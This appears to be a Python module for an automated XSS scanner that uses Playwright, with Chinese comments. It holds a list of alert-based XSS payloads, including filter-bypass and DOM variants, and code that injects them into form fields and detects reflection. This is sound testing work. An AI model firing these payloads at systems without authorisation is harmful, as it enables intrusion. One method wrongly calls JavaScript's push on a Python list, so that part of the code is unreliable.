from typing import Dict, List, Any, Optional
from playwright.async_api import Page
import asyncio
import re

from .base_tester import BaseTester

class XSSTester(BaseTester):
    """跨站脚本(XSS)漏洞测试模块"""
    
    def __init__(self, agent):
        super().__init__(agent)
        self.name = "xss"
        self.description = "跨站脚本(XSS)漏洞测试"
        self.payloads = {
            "basic": [
                "<script>alert('XSS')</script>",
                "<img src=\"x\" onerror=\"alert('XSS')\">",
                "<body onload=\"alert('XSS')\">",
                "<svg onload=\"alert('XSS')\">"
            ],
            "attribute": [
                "\" onmouseover=\"alert('XSS')\" \"",
                "\" onfocus=\"alert('XSS')\" autofocus=\"",
                "\" onload=\"alert('XSS')\" \""
            ],
            "js_contexts": [
                "\";alert('XSS');//",
                "'-alert('XSS')-'",
                "\"-alert('XSS')-\"",
                "</script><script>alert('XSS')</script>"
            ],
            "bypass": [
                "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
                "<IMG SRC=j&#X41vascript:alert('XSS')>",
                "<img src=x onerror=\\x61lert('XSS')>",
                "<iframe src=\"javascript:alert(`XSS`)\"></iframe>"
            ],
            "dom": [
                "#<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
            ]
        }
        self.contexts = ["html", "attribute", "js", "url", "style"]
        self.vulnerable_points = []
    
    async def test(self, target: Dict[str, Any]) -> Dict[str, Any]:
        """执行XSS漏洞测试"""
        self.test_results["status"] = "running"
        
        page = self.agent.page
        if not page:
            self.test_results["status"] = "error"
            self.record_test_result({
                "step": "init",
                "status": "error",
                "message": "浏览器页面未初始化"
            })
            return self.get_test_results()
        
        # 记录开始测试
        self.record_test_result({
            "step": "start", 
            "status": "info",
            "message": f"开始XSS漏洞测试，目标URL: {page.url}"
        })
        
        # 收集输入点
        input_points = await self.collect_input_points(page)
        
        if not input_points:
            self.record_test_result({
                "step": "input_collection",
                "status": "warning",
                "message": "未发现任何输入点"
            })
            self.test_results["status"] = "no_input_points"
            return self.get_test_results()
        
        self.record_test_result({
            "step": "input_collection",
            "status": "success",
            "message": f"发现 {len(input_points)} 个可能的输入点"
        })
        
        # 测试每个输入点
        vulnerable_inputs = []
        
        for idx, input_point in enumerate(input_points):
            # 跳过不适合XSS的输入类型
            if input_point["type"] in ["checkbox", "radio", "file", "button", "image", "hidden"]:
                continue
                
            # 进行XSS测试
            is_vulnerable, context = await self._test_input_point(page, input_point, idx)
            
            if is_vulnerable:
                vulnerable_inputs.append(input_point)
                input_point["xss_context"] = context
                
                # 记录漏洞
                self.record_vulnerability({
                    "input_point": input_point,
                    "vulnerability": "xss",
                    "context": context,
                    "details": f"该输入点存在XSS漏洞，上下文类型: {context}"
                })
                
                # 添加到易受攻击的点列表
                self.vulnerable_points.append({
                    "selector": input_point["selector"],
                    "context": context
                })
        
        # 更新测试状态
        if vulnerable_inputs:
            self.test_results["status"] = "vulnerable"
            self.record_test_result({
                "step": "summary",
                "status": "warning",
                "message": f"发现 {len(vulnerable_inputs)} 个存在XSS漏洞的输入点"
            })
        else:
            self.test_results["status"] = "secure"
            self.record_test_result({
                "step": "summary",
                "status": "success",
                "message": "未发现XSS漏洞"
            })
        
        return self.get_test_results()
    
    async def _test_input_point(self, page: Page, input_point: Dict[str, Any], idx: int) -> tuple[bool, str]:
        """测试特定输入点是否存在XSS漏洞"""
        selector = input_point["selector"]
        is_vulnerable = False
        context = ""
        
        self.record_test_result({
            "step": f"testing_input_{idx}",
            "status": "info",
            "message": f"正在测试输入点: {input_point.get('name', '') or input_point.get('id', '') or selector}"
        })
        
        # 测试基本XSS
        for payload in self.payloads["basic"]:
            result = await self._test_payload(page, selector, payload)
            if result["vulnerable"]:
                is_vulnerable = True
                context = "html"
                
                self.record_test_result({
                    "step": f"testing_input_{idx}_basic",
                    "status": "warning",
                    "message": f"发现基本XSS漏洞: {result['details']}"
                })
                
                # 更新输入点信息
                input_point["is_vulnerable"] = True
                input_point["vulnerability_types"] = ["xss_basic"]
                input_point["payload"] = payload
                
                return is_vulnerable, context
        
        # 测试属性上下文
        for payload in self.payloads["attribute"]:
            result = await self._test_payload(page, selector, payload)
            if result["vulnerable"]:
                is_vulnerable = True
                context = "attribute"
                
                self.record_test_result({
                    "step": f"testing_input_{idx}_attribute",
                    "status": "warning",
                    "message": f"发现属性上下文XSS漏洞: {result['details']}"
                })
                
                # 更新输入点信息
                input_point["is_vulnerable"] = True
                input_point["vulnerability_types"] = ["xss_attribute"]
                input_point["payload"] = payload
                
                return is_vulnerable, context
        
        # 测试JS上下文
        for payload in self.payloads["js_contexts"]:
            result = await self._test_payload(page, selector, payload)
            if result["vulnerable"]:
                is_vulnerable = True
                context = "js"
                
                self.record_test_result({
                    "step": f"testing_input_{idx}_js",
                    "status": "warning",
                    "message": f"发现JS上下文XSS漏洞: {result['details']}"
                })
                
                # 更新输入点信息
                input_point["is_vulnerable"] = True
                input_point["vulnerability_types"] = ["xss_js"]
                input_point["payload"] = payload
                
                return is_vulnerable, context
        
        # 测试绕过技术
        for payload in self.payloads["bypass"]:
            result = await self._test_payload(page, selector, payload)
            if result["vulnerable"]:
                is_vulnerable = True
                context = "filtered"
                
                self.record_test_result({
                    "step": f"testing_input_{idx}_bypass",
                    "status": "warning",
                    "message": f"发现过滤绕过XSS漏洞: {result['details']}"
                })
                
                # 更新输入点信息
                input_point["is_vulnerable"] = True
                input_point["vulnerability_types"] = ["xss_bypass"]
                input_point["payload"] = payload
                
                return is_vulnerable, context
        
        # 检测DOM XSS
        for payload in self.payloads["dom"]:
            result = await self._test_dom_xss(page, selector, payload)
            if result["vulnerable"]:
                is_vulnerable = True
                context = "dom"
                
                self.record_test_result({
                    "step": f"testing_input_{idx}_dom",
                    "status": "warning",
                    "message": f"发现DOM XSS漏洞: {result['details']}"
                })
                
                # 更新输入点信息
                input_point["is_vulnerable"] = True
                input_point["vulnerability_types"] = ["xss_dom"]
                input_point["payload"] = payload
                
                return is_vulnerable, context
        
        return is_vulnerable, context
    
    async def _test_payload(self, page: Page, selector: str, payload: str) -> Dict[str, Any]:
        """测试特定的XSS载荷在输入点上的效果"""
        results = {
            "vulnerable": False,
            "details": "",
            "payload": payload
        }
        
        # 设置警报检测
        alert_triggered = False
        
        async def handle_dialog(dialog):
            nonlocal alert_triggered
            alert_triggered = True
            await dialog.dismiss()
        
        # 注册对话框处理器
        page.on("dialog", handle_dialog)
        
        try:
            # 输入载荷
            await self._input_and_submit(page, selector, payload)
            await asyncio.sleep(2)  # 等待页面反应和可能的弹出窗口
            
            # 检查是否触发了警报
            if alert_triggered:
                results["vulnerable"] = True
                results["details"] = f"载荷 '{payload}' 成功触发了alert"
                return results
            
            # 如果没有警报，检查页面源代码中的载荷
            content = await page.content()
            
            # 删除所有空格以便更好地匹配
            clean_payload = payload.replace(" ", "")
            clean_content = content.replace(" ", "")
            
            # 检查载荷是否未经过滤地注入到了页面中
            if clean_payload in clean_content:
                # 确认载荷没有被编码或转义
                if "&lt;script&gt;" not in clean_content and payload.replace("<", "&lt;").replace(">", "&gt;") not in content:
                    results["vulnerable"] = True
                    results["details"] = f"载荷 '{payload}' 未经过滤地注入到了页面中"
            
            # 检查载荷的关键部分是否在页面中（可能部分过滤）
            if not results["vulnerable"]:
                if "script" in payload.lower() and "script" in content.lower():
                    # 分析源代码中的script标签
                    if await self._check_script_injection(page):
                        results["vulnerable"] = True
                        results["details"] = f"载荷 '{payload}' 部分注入，script标签存在"
                
                # 检查事件处理程序
                elif any(event in payload.lower() for event in ["onerror", "onload", "onclick", "onmouseover"]):
                    for event in ["onerror", "onload", "onclick", "onmouseover"]:
                        if event in payload.lower() and event in content.lower():
                            results["vulnerable"] = True
                            results["details"] = f"载荷 '{payload}' 部分注入，事件处理程序 {event} 存在"
                            break
            
        except Exception as e:
            # 记录异常但继续测试
            self.record_test_result({
                "step": "payload_test",
                "status": "error",
                "message": f"测试载荷 '{payload}' 时发生错误: {str(e)}"
            })
        finally:
            # 移除对话框处理器
            page.remove_listener("dialog", handle_dialog)
            
            # 返回到原始页面
            try:
                await page.go_back()
                await asyncio.sleep(1)  # 等待页面加载
            except:
                # 如果导航失败，可能页面已刷新或重定向
                pass
        
        return results
    
    async def _test_dom_xss(self, page: Page, selector: str, payload: str) -> Dict[str, Any]:
        """测试DOM类型的XSS漏洞"""
        results = {
            "vulnerable": False,
            "details": "",
            "payload": payload
        }
        
        # 设置警报检测
        alert_triggered = False
        
        async def handle_dialog(dialog):
            nonlocal alert_triggered
            alert_triggered = True
            await dialog.dismiss()
        
        # 注册对话框处理器
        page.on("dialog", handle_dialog)
        
        try:
            # 对于DOM XSS，我们需要测试URL中的参数注入
            # 获取当前URL
            current_url = page.url
            
            # 如果输入是URL相关的，尝试直接在URL中注入
            if input_type_suggests_url(selector):
                # 构建带有载荷的URL
                new_url = inject_payload_to_url(current_url, payload)
                
                # 导航到新URL
                await page.goto(new_url)
                await asyncio.sleep(2)  # 等待页面反应
                
                # 检查是否触发了警报
                if alert_triggered:
                    results["vulnerable"] = True
                    results["details"] = f"DOM XSS测试成功，URL载荷 '{payload}' 触发了alert"
                    return results
            
            # 标准输入测试
            await self._input_and_submit(page, selector, payload)
            await asyncio.sleep(2)  # 等待页面反应
            
            # 检查是否触发了警报
            if alert_triggered:
                results["vulnerable"] = True
                results["details"] = f"DOM XSS测试成功，载荷 '{payload}' 触发了alert"
                return results
            
            # 检查JavaScript错误
            # 尝试运行一些JavaScript来验证DOM变化
            js_errors = await self._check_dom_manipulation(page, payload)
            if js_errors:
                results["vulnerable"] = True
                results["details"] = f"DOM可能易受攻击，JavaScript产生了意外错误: {js_errors}"
                return results
            
        except Exception as e:
            # 记录异常但继续测试
            self.record_test_result({
                "step": "dom_xss_test",
                "status": "error",
                "message": f"测试DOM XSS载荷 '{payload}' 时发生错误: {str(e)}"
            })
        finally:
            # 移除对话框处理器
            page.remove_listener("dialog", handle_dialog)
            
            # 返回到原始页面
            try:
                await page.go_back()
                await asyncio.sleep(1)  # 等待页面加载
            except:
                # 如果导航失败，可能页面已刷新或重定向
                pass
        
        return results
    
    async def _check_script_injection(self, page: Page) -> bool:
        """检查页面中是否有可能被注入的脚本"""
        # 检查所有脚本标签
        scripts = await page.evaluate("""() => {
            const scripts = document.querySelectorAll('script');
            return Array.from(scripts).map(s => s.innerHTML || '');
        }""")
        
        # 检查每个脚本是否包含alert
        for script in scripts:
            if "alert" in script:
                return True
        
        return False
    
    async def _check_dom_manipulation(self, page: Page, payload: str) -> str:
        """检查DOM操作是否导致JavaScript错误"""
        # 记录JavaScript错误
        js_errors = []
        
        # 设置页面错误处理
        async def handle_page_error(error):
            js_errors.append(str(error))
        
        # 注册错误处理器
        page.on("pageerror", handle_page_error)
        
        try:
            # 尝试通过JavaScript检测DOM变化
            # 例如，检查document.write或innerHTML被调用
            dom_check_result = await page.evaluate("""() => {
                try {
                    // 检查可能被污染的DOM部分
                    const loc = window.location.href;
                    const params = new URLSearchParams(window.location.search);
                    
                    // 检查常见的DOM XSS源
                    const sources = [
                        loc,
                        document.referrer,
                        document.URL,
                        document.documentURI,
                        document.baseURI,
                        params.toString()
                    ];
                    
                    // 检查这些源是否包含可能的XSS载荷
                    for (const source of sources) {
                        if (source.includes('script') || 
                            source.includes('alert') || 
                            source.includes('onerror') || 
                            source.includes('onload')) {
                            return `可能的DOM XSS源: ${source}`;
                        }
                    }
                    
                    return null;
                } catch (e) {
                    return `JavaScript错误: ${e.message}`;
                }
            }""")
            
            if dom_check_result:
                js_errors.push(dom_check_result)
        finally:
            # 移除错误处理器
            page.remove_listener("pageerror", handle_page_error)
        
        return "\n".join(js_errors) if js_errors else ""
    
    async def _input_and_submit(self, page: Page, selector: str, value: str) -> None:
        """输入内容并提交表单"""
        try:
            # 清除原有内容
            await page.fill(selector, "")
            # 输入新内容
            await page.fill(selector, value)
            
            # 查找可能的提交按钮
            form = await page.query_selector(f"{selector} >> xpath=ancestor::form")
            
            if form:
                # 如果输入在表单中，查找表单的提交按钮
                submit_button = await form.query_selector('input[type="submit"], button[type="submit"], button:has-text("Submit"), button')
                if submit_button:
                    await submit_button.click()
                    return
            
            # 如果没有找到提交按钮，尝试按回车键
            await page.press(selector, "Enter")
            
        except Exception as e:
            # 忽略错误，表单提交可能会导致页面跳转
            pass
    
    async def verify_vulnerability(self, page: Page, input_selector: str, payload: str) -> Dict[str, Any]:
        """验证特定输入点是否存在XSS漏洞"""
        # 设置警报检测
        alert_triggered = False
        
        async def handle_dialog(dialog):
            nonlocal alert_triggered
            alert_triggered = True
            await dialog.dismiss()
        
        # 注册对话框处理器
        page.on("dialog", handle_dialog)
        
        result = {
            "vulnerable": False,
            "details": "",
            "payload": payload
        }
        
        try:
            # 输入载荷
            await self._input_and_submit(page, input_selector, payload)
            await asyncio.sleep(2)  # 等待页面反应
            
            # 检查是否触发了警报
            if alert_triggered:
                result["vulnerable"] = True
                result["details"] = f"验证成功，载荷触发了alert"
            else:
                # 检查页面源代码
                content = await page.content()
                if payload in content and "<script>" in content:
                    result["vulnerable"] = True
                    result["details"] = f"验证成功，载荷被注入到页面中但未执行"
        finally:
            # 移除对话框处理器
            page.remove_listener("dialog", handle_dialog)
            
            # 返回到原始页面
            try:
                await page.go_back()
                await asyncio.sleep(1)
            except:
                pass
        
        return result


def input_type_suggests_url(selector: str) -> bool:
    """检查输入选择器是否与URL相关"""
    # 检查输入名称是否与URL或链接相关
    url_related_terms = ["url", "link", "href", "src", "location", "redirect", "goto"]
    
    selector_lower = selector.lower()
    
    for term in url_related_terms:
        if term in selector_lower:
            return True
    
    return False


def inject_payload_to_url(url: str, payload: str) -> str:
    """将载荷注入到URL中"""
    # 检查URL是否已有参数
    if "?" in url:
        # 附加新参数
        return f"{url}&xss={payload}"
    else:
        # 添加第一个参数
        return f"{url}?xss={payload}" 